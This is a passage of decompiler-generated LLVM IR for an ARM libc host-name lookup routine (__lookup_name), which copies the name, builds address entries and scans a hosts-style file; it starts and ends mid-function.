  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v0_cb84 = load i32, i32* %sl.global-to-local, align 4
  %v2_cb84 = add i32 %v0_cb84, %v1_cb74
  %v3_cb84 = inttoptr i32 %v2_cb84 to i8*
  %v4_cb84 = load i8, i8* %v3_cb84, align 1
  %v1_cb88 = load i32, i32* %sb.global-to-local, align 4
  %v2_cb88 = add i32 %v1_cb88, %v2_cb74
  %v3_cb88 = inttoptr i32 %v2_cb88 to i8*
  %v4_cb88 = load i8, i8* %v3_cb88, align 1
  %v2_cb8c9 = and i8 %v4_cb84, %v3_cb80
  %v9_cb90 = icmp eq i8 %v4_cb88, %v2_cb8c9
  br i1 %v9_cb90, label %dec_label_pc_cba0, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb54.dec_label_pc_cb98_crit_edge, %dec_label_pc_cb80
  %v0_cb60.pre = phi i32 [ %v0_cb60.pre.pre, %dec_label_pc_cb54.dec_label_pc_cb98_crit_edge ], [ %v0_cb84, %dec_label_pc_cb80 ]
  %v1_cb5c.pre = phi i32 [ %v1_cb5c.pre.pre, %dec_label_pc_cb54.dec_label_pc_cb98_crit_edge ], [ %v1_cb88, %dec_label_pc_cb80 ]
  %v1_cb98 = add i32 %v0_cb80, 20
  store i32 %v1_cb98, i32* %r6.global-to-local, align 4
  %v1_cb54.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_cb54

dec_label_pc_cba0:                                ; preds = %dec_label_pc_cb80
  %v0_cba0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_cba0

; uselistorder directives
  uselistorder i32 %v1_cb98, { 1, 0 }
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v0_cb84, { 1, 0 }
  uselistorder i32 %v1_cb78, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_19c81.484 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cb98, { 1, 0 }
}

define i32 @__lookup_name(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp163 = ptrtoint i32* %arg1 to i32
  %tmp171 = call i8 @__decompiler_undefined_function_3()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1992 = alloca i32, align 4
  %stack_var_-2504 = alloca i32, align 4
  %stack_var_-1480 = alloca i32, align 4
  %stack_var_-919 = alloca i32, align 4
  %stack_var_-920 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-3536 = alloca i32, align 4
  %stack_var_-244 = alloca i32, align 4
  %stack_var_-260 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %v3_cbb4 = load i32, i32* @r4, align 4
  %v6_cbb4 = load i32, i32* @r5, align 4
  %v9_cbb4 = load i32, i32* @r6, align 4
  %v15_cbb4 = load i32, i32* @r8, align 4
  %v21_cbb4 = load i32, i32* @sl, align 4
  %v27_cbb4 = load i32, i32* @lr, align 4
  store i32 %arg3, i32* @sl, align 4
  %v3_cbc0 = icmp eq i32 %arg3, 0
  store i1 %v3_cbc0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %tmp, align 1
  store i32 %tmp163, i32* @r8, align 4
  %v0_cbd4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_cbd4, i32* @sb, align 4
  %v3_cbd8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_cbd8, i32* @fp, align 4
  %v0_cbdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cbdc, label %dec_label_pc_cc08, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %entry
  %v0_cbe0 = load i32, i32* @sl, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v3_cbe8 = call i32 @strnlen(i32 %v0_cbe0, i32 255)
  %v1_cbec = add i32 %v3_cbe8, -1
  store i32 %v1_cbec, i32* @r3, align 4
  %v2_cbf0 = icmp ugt i32 %v1_cbec, 252
  %v7_cbf0 = icmp eq i32 %v1_cbec, 253
  store i1 %v7_cbf0, i1* %cpsr_z.global-to-local, align 1
  %v2_cbf4 = xor i1 %v7_cbf0, true
  %v3_cbf4 = and i1 %v2_cbf0, %v2_cbf4
  br i1 %v3_cbf4, label %dec_label_pc_d0e8, label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbe0
  %v1_cbf8 = add i32 %v3_cbe8, 1
  store i32 %v1_cbf8, i32* %r2.global-to-local, align 4
  %v0_cbfc = load i32, i32* @sl, align 4
  store i32 %v0_cbfc, i32* %r1.global-to-local, align 4
  %tmp255 = inttoptr i32 %arg2 to i16*
  %v6_cc04 = call i32 @memcpy(i16* %tmp255, i32 %v0_cbfc, i32 %v1_cbf8)
  %v0_cc08.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_cc08

dec_label_pc_cc08:                                ; preds = %entry, %dec_label_pc_cbf8
  %v1_cc18 = phi i32 [ %v3_cbd8, %entry ], [ %v0_cc08.pre, %dec_label_pc_cbf8 ]
  %v1_cc08 = and i32 %v1_cc18, 8
  %v2_cc08 = icmp eq i32 %v1_cc08, 0
  store i1 %v2_cc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc08, label %bb256, label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc08
  %v0_cc10 = load i32, i32* @sb, align 4
  %v7_cc10 = icmp eq i32 %v0_cc10, 10
  store i1 %v7_cc10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cc10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_cc10
  store i32 0, i32* @sb, align 4
  br label %bb256

.thread:                                          ; preds = %dec_label_pc_cc10
  %v2_cc18 = add i32 %v1_cc18, -8
  store i32 %v2_cc18, i32* @fp, align 4
  br label %bb256

bb256:                                            ; preds = %bb, %dec_label_pc_cc08, %.thread
  %v0_cc24 = phi i32 [ %v1_cc18, %dec_label_pc_cc08 ], [ %v1_cc18, %bb ], [ %v2_cc18, %.thread ]
  %v0_cc1c = load i32, i32* @sl, align 4
  %v2_cc1c = icmp eq i32 %v0_cc1c, 0
  store i1 %v2_cc1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc1c, label %dec_label_pc_cc24, label %dec_label_pc_cd70

dec_label_pc_cc24:                                ; preds = %bb256
  %v1_cc24 = urem i32 %v0_cc24, 2
  %v2_cc24 = icmp eq i32 %v1_cc24, 0
  %v0_ccbc = load i32, i32* @sb, align 4
  %v7_ccbc = icmp eq i32 %v0_ccbc, 10
  store i1 %v7_ccbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc24, label %dec_label_pc_ccbc, label %dec_label_pc_cc2c

dec_label_pc_cc2c:                                ; preds = %dec_label_pc_cc24
  br i1 %v7_ccbc, label %dec_label_pc_cc78, label %dec_label_pc_cc38

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc2c
  %v2_cc38 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_cc38, i32* @r4, align 4
  store i32 0, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_cc38, i32* @r0, align 4
  %v0_cc48 = call i32 @memset()
  store i32 2, i32* %stack_var_-176, align 4
  %v13_cc58 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v13_cc58, i32* @ip, align 4
  %v0_cc5c = load i32, i32* @r8, align 4
  %v1_cc60 = inttoptr i32 %v0_cc5c to i32*
  store i32 2, i32* %v1_cc60, align 4
  %v3_cc60 = add i32 %v0_cc5c, 4
  %v4_cc60 = inttoptr i32 %v3_cc60 to i32*
  %v5_cc60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cc60, i32* %v4_cc60, align 4
  %v6_cc60 = add i32 %v0_cc5c, 8
  %v7_cc60 = inttoptr i32 %v6_cc60 to i32*
  %v8_cc60 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_cc60, i32* %v7_cc60, align 4
  %v9_cc60 = add i32 %v0_cc5c, 12
  %v10_cc60 = inttoptr i32 %v9_cc60 to i32*
  %v11_cc60 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_cc60, i32* %v10_cc60, align 4
  %v12_cc60 = add i32 %v0_cc5c, 16
  store i32 %v12_cc60, i32* @r4, align 4
  %v2_cc64 = load i32, i32* %stack_var_-160, align 4
  %v0_cc68 = load i32, i32* @sb, align 4
  %v7_cc68 = icmp eq i32 %v0_cc68, 2
  store i1 %v7_cc68, i1* %cpsr_z.global-to-local, align 1
  %v1_cc6c = inttoptr i32 %v12_cc60 to i32*
  store i32 %v2_cc64, i32* %v1_cc6c, align 4
  %v3_cc6c = add i32 %v0_cc5c, 20
  %v4_cc6c = inttoptr i32 %v3_cc6c to i32*
  %v5_cc6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cc6c, i32* %v4_cc6c, align 4
  %v6_cc6c = add i32 %v0_cc5c, 24
  %v7_cc6c = inttoptr i32 %v6_cc6c to i32*
  %v8_cc6c = load i32, i32* @r2, align 4
  store i32 %v8_cc6c, i32* %v7_cc6c, align 4
  br i1 %v7_cc68, label %dec_label_pc_d424, label %dec_label_pc_cc78

dec_label_pc_cc78:                                ; preds = %dec_label_pc_cc38, %dec_label_pc_cc2c
  %storemerge161 = phi i32 [ 0, %dec_label_pc_cc2c ], [ 1, %dec_label_pc_cc38 ]
  store i32 %storemerge161, i32* @r6, align 4
  %v2_cc7c = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_cc7c, i32* @r4, align 4
  store i32 28, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_cc7c, i32* @r0, align 4
  %v0_cc90 = call i32 @memset()
  %v0_cc94 = load i32, i32* @r6, align 4
  %v1_cc94 = load i32, i32* @r5, align 4
  %v2_cc94 = load i32, i32* @r8, align 4
  %v3_cc94 = mul i32 %v1_cc94, %v0_cc94
  %v4_cc94 = add i32 %v2_cc94, %v3_cc94
  store i32 10, i32* %stack_var_-204, align 4
  %v13_cca4 = ptrtoint i32* %stack_var_-188 to i32
  store i32 %v13_cca4, i32* @ip, align 4
  %v1_cca8 = inttoptr i32 %v4_cc94 to i32*
  store i32 10, i32* %v1_cca8, align 4
  %v3_cca8 = add i32 %v4_cc94, 4
  %v4_cca8 = inttoptr i32 %v3_cca8 to i32*
  %v5_cca8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cca8, i32* %v4_cca8, align 4
  %v6_cca8 = add i32 %v4_cc94, 8
  %v7_cca8 = inttoptr i32 %v6_cca8 to i32*
  %v8_cca8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_cca8, i32* %v7_cca8, align 4
  %v9_cca8 = add i32 %v4_cc94, 12
  %v10_cca8 = inttoptr i32 %v9_cca8 to i32*
  %v11_cca8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_cca8, i32* %v10_cca8, align 4
  %v12_cca8 = add i32 %v4_cc94, 16
  store i32 %v12_cca8, i32* @lr, align 4
  %v2_ccac = load i32, i32* %stack_var_-188, align 4
  %v0_ccb0 = load i32, i32* @r6, align 4
  %v1_ccb0 = add i32 %v0_ccb0, 1
  store i32 %v1_ccb0, i32* @r7, align 4
  %v1_ccb4 = inttoptr i32 %v12_cca8 to i32*
  store i32 %v2_ccac, i32* %v1_ccb4, align 4
  %v3_ccb4 = add i32 %v4_cc94, 20
  %v4_ccb4 = inttoptr i32 %v3_ccb4 to i32*
  %v5_ccb4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_ccb4, i32* %v4_ccb4, align 4
  %v6_ccb4 = add i32 %v4_cc94, 24
  %v7_ccb4 = inttoptr i32 %v6_ccb4 to i32*
  %v8_ccb4 = load i32, i32* @r2, align 4
  store i32 %v8_ccb4, i32* %v7_ccb4, align 4
  %v0_cd68.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_cd68

dec_label_pc_ccbc:                                ; preds = %dec_label_pc_cc24
  br i1 %v7_ccbc, label %dec_label_pc_cd1c, label %dec_label_pc_ccc8

dec_label_pc_ccc8:                                ; preds = %dec_label_pc_ccbc
  %v2_cccc = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_cccc, i32* @r4, align 4
  store i32 0, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_cccc, i32* @r0, align 4
  %v0_ccdc = call i32 @memset()
  store i32 1, i32* @lr, align 4
  store i32 2, i32* %stack_var_-232, align 4
  store i32 127, i32* %r2.global-to-local, align 4
  %v14_ccfc = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v14_ccfc, i32* @ip, align 4
  %v0_cd00 = load i32, i32* @r8, align 4
  %v1_cd04 = inttoptr i32 %v0_cd00 to i32*
  store i32 2, i32* %v1_cd04, align 4
  %v3_cd04 = add i32 %v0_cd00, 4
  %v4_cd04 = inttoptr i32 %v3_cd04 to i32*
  %v5_cd04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cd04, i32* %v4_cd04, align 4
  %v6_cd04 = add i32 %v0_cd00, 8
  %v7_cd04 = inttoptr i32 %v6_cd04 to i32*
  %v8_cd04 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_cd04, i32* %v7_cd04, align 4
  %v9_cd04 = add i32 %v0_cd00, 12
  %v10_cd04 = inttoptr i32 %v9_cd04 to i32*
  %v11_cd04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_cd04, i32* %v10_cd04, align 4
  %v12_cd04 = add i32 %v0_cd00, 16
  store i32 %v12_cd04, i32* @r4, align 4
  %v2_cd08 = load i32, i32* %stack_var_-216, align 4
  %v0_cd0c = load i32, i32* @sb, align 4
  %v7_cd0c = icmp eq i32 %v0_cd0c, 2
  store i1 %v7_cd0c, i1* %cpsr_z.global-to-local, align 1
  %v1_cd10 = inttoptr i32 %v12_cd04 to i32*
  store i32 %v2_cd08, i32* %v1_cd10, align 4
  %v3_cd10 = add i32 %v0_cd00, 20
  %v4_cd10 = inttoptr i32 %v3_cd10 to i32*
  %v5_cd10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cd10, i32* %v4_cd10, align 4
  %v6_cd10 = add i32 %v0_cd00, 24
  %v7_cd10 = inttoptr i32 %v6_cd10 to i32*
  %v8_cd10 = load i32, i32* @r2, align 4
  store i32 %v8_cd10, i32* %v7_cd10, align 4
  br i1 %v7_cd0c, label %dec_label_pc_d424, label %dec_label_pc_cd18

dec_label_pc_cd18:                                ; preds = %dec_label_pc_ccc8
  %v0_cd18 = load i32, i32* @lr, align 4
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_ccbc, %dec_label_pc_cd18
  %storemerge162 = phi i32 [ %v0_cd18, %dec_label_pc_cd18 ], [ 0, %dec_label_pc_ccbc ]
  store i32 %storemerge162, i32* @r6, align 4
  %v2_cd20 = ptrtoint i32* %stack_var_-260 to i32
  store i32 %v2_cd20, i32* @r4, align 4
  store i32 28, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_cd20, i32* @r0, align 4
  %v0_cd34 = call i32 @memset()
  %v0_cd38 = load i32, i32* @r6, align 4
  %v1_cd38 = load i32, i32* @r5, align 4
  %v2_cd38 = load i32, i32* @r8, align 4
  %v3_cd38 = mul i32 %v1_cd38, %v0_cd38
  %v4_cd38 = add i32 %v2_cd38, %v3_cd38
  store i32 %v4_cd38, i32* @ip, align 4
  store i32 10, i32* %stack_var_-260, align 4
  %v13_cd48 = ptrtoint i32* %stack_var_-244 to i32
  store i32 %v13_cd48, i32* @lr, align 4
  %v1_cd50 = inttoptr i32 %v4_cd38 to i32*
  store i32 10, i32* %v1_cd50, align 4
  %v3_cd50 = add i32 %v4_cd38, 4
  %v4_cd50 = inttoptr i32 %v3_cd50 to i32*
  %v5_cd50 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cd50, i32* %v4_cd50, align 4
  %v6_cd50 = add i32 %v4_cd38, 8
  %v7_cd50 = inttoptr i32 %v6_cd50 to i32*
  %v8_cd50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_cd50, i32* %v7_cd50, align 4
  %v9_cd50 = add i32 %v4_cd38, 12
  %v10_cd50 = inttoptr i32 %v9_cd50 to i32*
  %v11_cd50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_cd50, i32* %v10_cd50, align 4
  %v12_cd50 = add i32 %v4_cd38, 16
  store i32 %v12_cd50, i32* @r4, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_cd5c = load i32, i32* %stack_var_-244, align 4
  %v1_cd60 = inttoptr i32 %v12_cd50 to i32*
  store i32 %v2_cd5c, i32* %v1_cd60, align 4
  %v3_cd60 = add i32 %v4_cd38, 20
  %v4_cd60 = inttoptr i32 %v3_cd60 to i32*
  %v5_cd60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cd60, i32* %v4_cd60, align 4
  %v6_cd60 = add i32 %v4_cd38, 24
  %v7_cd60 = inttoptr i32 %v6_cd60 to i32*
  %v8_cd60 = load i32, i32* @r2, align 4
  store i32 %v8_cd60, i32* %v7_cd60, align 4
  %v0_cd64 = load i32, i32* @r6, align 4
  %v1_cd64 = load i32, i32* %r3.global-to-local, align 4
  %v2_cd64 = add i32 %v1_cd64, %v0_cd64
  store i32 %v2_cd64, i32* @r7, align 4
  br label %dec_label_pc_cd68

dec_label_pc_cd68:                                ; preds = %dec_label_pc_cc78, %dec_label_pc_cd1c
  %v0_cd68 = phi i32 [ %v0_cd68.pr, %dec_label_pc_cc78 ], [ %v2_cd64, %dec_label_pc_cd1c ]
  %v2_cd68 = icmp eq i32 %v0_cd68, 0
  store i1 %v2_cd68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cd68, label %dec_label_pc_cd68.dec_label_pc_cd70_crit_edge, label %dec_label_pc_d0dc

dec_label_pc_cd68.dec_label_pc_cd70_crit_edge:    ; preds = %dec_label_pc_cd68
  %v0_cd74.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_cd70

dec_label_pc_cd70:                                ; preds = %dec_label_pc_cd68.dec_label_pc_cd70_crit_edge, %bb256
  %v0_cd74 = phi i32 [ %v0_cd74.pre, %dec_label_pc_cd68.dec_label_pc_cd70_crit_edge ], [ %v0_cc1c, %bb256 ]
  %v0_cd70 = load i32, i32* @r8, align 4
  store i32 %v0_cd70, i32* @r0, align 4
  store i32 %v0_cd74, i32* @r1, align 4
  %v0_cd78 = load i32, i32* @sb, align 4
  store i32 %v0_cd78, i32* @r2, align 4
  %v3_cd7c = call i32 @name_from_numeric(i32 %v0_cd70, i32 %v0_cd74, i32 %v0_cd78)
  store i32 %v3_cd7c, i32* @r7, align 4
  %v2_cd80 = icmp eq i32 %v3_cd7c, 0
  store i1 %v2_cd80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cd80, label %dec_label_pc_cd88, label %dec_label_pc_d0dc

dec_label_pc_cd88:                                ; preds = %dec_label_pc_cd70
  %v0_cd88 = load i32, i32* @fp, align 4
  %v1_cd88 = and i32 %v0_cd88, 4
  %v2_cd88 = icmp eq i32 %v1_cd88, 0
  store i1 %v2_cd88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cd88, label %dec_label_pc_cd90, label %dec_label_pc_d0e8

dec_label_pc_cd90:                                ; preds = %dec_label_pc_cd88
  %v0_cd90 = load i32, i32* @sl, align 4
  %v1_cd90 = inttoptr i32 %v0_cd90 to i8*
  %v3_cd94 = call i32 @strlen(i8* %v1_cd90)
  %v2_cda4 = ptrtoint i32* %stack_var_-3536 to i32
  store i32 %v2_cda4, i32* %r2.global-to-local, align 4
  %v2_cdac = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_cdac, i32* %r1.global-to-local, align 4
  store i32 1032, i32* %r3.global-to-local, align 4
  %v7_cdb4 = call i32 @__fopen_rb_ca(i32 ptrtoint ([11 x i8]* @global_var_19c68.486 to i32), i32* nonnull %stack_var_-408, i32 %v2_cda4, i32 1032, i32 %v3_cd94)
  %v2_cdb8 = icmp eq i32 %v7_cdb4, 0
  store i1 %v2_cdb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cdb8, label %dec_label_pc_cf38, label %dec_label_pc_cef8

dec_label_pc_cdc8:                                ; preds = %dec_label_pc_cf20
  store i32 35, i32* %r1.global-to-local, align 4
  store i32 %v2_cefc, i32* @r0, align 4
  %v2_cdd0 = call i32 @strchr(i32 %v2_cefc, i32 35)
  %v3_cdd0 = inttoptr i32 %v2_cdd0 to i8*
  %v3_cdd4 = icmp eq i32 %v2_cdd0, 0
  store i1 %v3_cdd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cdd4, label %.thread5, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_cdc8
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v5_cde0 = add i32 %v2_cdd0, 1
  %v6_cde0 = inttoptr i32 %v5_cde0 to i8*
  store i8 0, i8* %v6_cde0, align 1
  %v0_cde4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cde4.pr.pr, label %.thread5, label %bb257

bb257:                                            ; preds = %.thread4
  %v1_cde4 = load i32, i32* %r1.global-to-local, align 4
  %v2_cde4 = trunc i32 %v1_cde4 to i8
  store i8 %v2_cde4, i8* %v3_cdd0, align 1
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_cdc8, %.thread4, %bb257
  store i32 %v2_cf00, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %bb259, %bb258, %.thread5
  %v0_cdec = phi i32 [ %v2_cf00, %.thread5 ], [ %v1_cdfc, %bb258 ], [ %v1_cdfc, %bb259 ]
  %v0_cdf0 = load i32, i32* @sl, align 4
  %v1_cdf0 = inttoptr i32 %v0_cdf0 to i8*
  store i32 %v0_cdf0, i32* %r1.global-to-local, align 4
  %v4_cdf4 = call i32 @strstr(i32 %v0_cdec, i8* %v1_cdf0)
  %v2_cdf8 = icmp eq i32 %v4_cdf4, 0
  store i1 %v2_cdf8, i1* %cpsr_z.global-to-local, align 1
  %v1_cdfc = add i32 %v4_cdf4, 1
  store i32 %v1_cdfc, i32* %r1.global-to-local, align 4
  br i1 %v2_cdf8, label %dec_label_pc_cf08.backedge, label %dec_label_pc_ce04

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdec
  %v1_ce04 = add i32 %v4_cdf4, -1
  %v2_ce04 = inttoptr i32 %v1_ce04 to i8*
  %v3_ce04 = load i8, i8* %v2_ce04, align 1
  %v4_ce04 = zext i8 %v3_ce04 to i32
  store i32 %v4_ce04, i32* %r2.global-to-local, align 4
  %v1_ce08 = add nsw i32 %v4_ce04, -9
  store i32 %v1_ce08, i32* %r3.global-to-local, align 4
  %v7_ce0c = icmp eq i8 %v3_ce04, 32
  store i1 %v7_ce0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce0c, label %dec_label_pc_ce18, label %bb258

bb258:                                            ; preds = %dec_label_pc_ce04
  %v3_ce10 = icmp ugt i32 %v1_ce08, 3
  %v8_ce10 = icmp eq i32 %v1_ce08, 4
  store i1 %v8_ce10, i1* %cpsr_z.global-to-local, align 1
  %v2_ce14 = xor i1 %v8_ce10, true
  %v3_ce14 = and i1 %v3_ce10, %v2_ce14
  br i1 %v3_ce14, label %dec_label_pc_cdec, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_ce04, %bb258
  store i32 %v3_cd94, i32* %r3.global-to-local, align 4
  %v2_ce1c = add i32 %v4_cdf4, %v3_cd94
  %v3_ce1c = inttoptr i32 %v2_ce1c to i8*
  %v4_ce1c = load i8, i8* %v3_ce1c, align 1
  %v6_ce1c = zext i8 %v4_ce1c to i32
  store i32 %v6_ce1c, i32* %r2.global-to-local, align 4
  %v1_ce20 = add nsw i32 %v6_ce1c, -9
  store i32 %v1_ce20, i32* %r3.global-to-local, align 4
  %v7_ce24 = icmp eq i8 %v4_ce1c, 32
  store i1 %v7_ce24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce24, label %dec_label_pc_ce3c.preheader, label %bb259

bb259:                                            ; preds = %dec_label_pc_ce18
  %v3_ce28 = icmp ugt i32 %v1_ce20, 3
  %v8_ce28 = icmp eq i32 %v1_ce20, 4
  store i1 %v8_ce28, i1* %cpsr_z.global-to-local, align 1
  %v2_ce2c = xor i1 %v8_ce28, true
  %v3_ce2c = and i1 %v3_ce28, %v2_ce2c
  br i1 %v3_ce2c, label %dec_label_pc_cdec, label %dec_label_pc_ce3c.preheader

dec_label_pc_ce3c.preheader:                      ; preds = %dec_label_pc_ce18, %bb259
  store i32 %v2_cefc, i32* @r4, align 4
  %v2_ce3c33 = load i8, i8* %v3_cf14, align 4
  %v3_ce3c34 = zext i8 %v2_ce3c33 to i32
  store i32 %v3_ce3c34, i32* %r3.global-to-local, align 4
  %v2_ce4035 = icmp eq i8 %v2_ce3c33, 0
  store i1 %v2_ce4035, i1* %cpsr_z.global-to-local, align 1
  %v1_ce4436 = add nsw i32 %v3_ce3c34, -9
  store i32 %v1_ce4436, i32* %r2.global-to-local, align 4
  br i1 %v2_ce4035, label %dec_label_pc_ce58, label %dec_label_pc_ce4c

dec_label_pc_ce38:                                ; preds = %bb260
  %v1_ce38 = add i32 %v0_ce38, 1
  store i32 %v1_ce38, i32* @r4, align 4
  %v1_ce3c = inttoptr i32 %v1_ce38 to i8*
  %v2_ce3c = load i8, i8* %v1_ce3c, align 1
  %v3_ce3c = zext i8 %v2_ce3c to i32
  store i32 %v3_ce3c, i32* %r3.global-to-local, align 4
  %v2_ce40 = icmp eq i8 %v2_ce3c, 0
  store i1 %v2_ce40, i1* %cpsr_z.global-to-local, align 1
  %v1_ce44 = add nsw i32 %v3_ce3c, -9
  store i32 %v1_ce44, i32* %r2.global-to-local, align 4
  br i1 %v2_ce40, label %dec_label_pc_ce58, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce3c.preheader, %dec_label_pc_ce38
  %v0_ce38 = phi i32 [ %v1_ce38, %dec_label_pc_ce38 ], [ %v2_cefc, %dec_label_pc_ce3c.preheader ]
  %v1_ce50 = phi i32 [ %v1_ce44, %dec_label_pc_ce38 ], [ %v1_ce4436, %dec_label_pc_ce3c.preheader ]
  %v0_ce4c = phi i32 [ %v3_ce3c, %dec_label_pc_ce38 ], [ %v3_ce3c34, %dec_label_pc_ce3c.preheader ]
  %v7_ce4c = icmp eq i32 %v0_ce4c, 32
  store i1 %v7_ce4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce4c, label %dec_label_pc_ce58, label %bb260

bb260:                                            ; preds = %dec_label_pc_ce4c
  %v3_ce50 = icmp ugt i32 %v1_ce50, 3
  %v8_ce50 = icmp eq i32 %v1_ce50, 4
  store i1 %v8_ce50, i1* %cpsr_z.global-to-local, align 1
  %v2_ce54 = xor i1 %v8_ce50, true
  %v3_ce54 = and i1 %v3_ce50, %v2_ce54
  br i1 %v3_ce54, label %dec_label_pc_ce38, label %dec_label_pc_ce58

dec_label_pc_ce58:                                ; preds = %dec_label_pc_ce4c, %dec_label_pc_ce38, %bb260, %dec_label_pc_ce3c.preheader
  %v2_ce6c = phi i32 [ %v2_cefc, %dec_label_pc_ce3c.preheader ], [ %v0_ce38, %dec_label_pc_ce4c ], [ %v1_ce38, %dec_label_pc_ce38 ], [ %v0_ce38, %bb260 ]
  store i32 0, i32* @lr, align 4
  %v0_ce60 = load i32, i32* @r7, align 4
  %v2_ce60 = load i32, i32* @r8, align 4
  %v3_ce60 = mul i32 %v0_ce60, 28
  %v4_ce60 = add i32 %v2_ce60, %v3_ce60
  store i32 %v4_ce60, i32* @r0, align 4
  store i32 %v2_cefc, i32* @r1, align 4
  %v0_ce68 = load i32, i32* @sb, align 4
  store i32 %v0_ce68, i32* @r2, align 4
  %v3_ce6c = inttoptr i32 %v2_ce6c to i8*
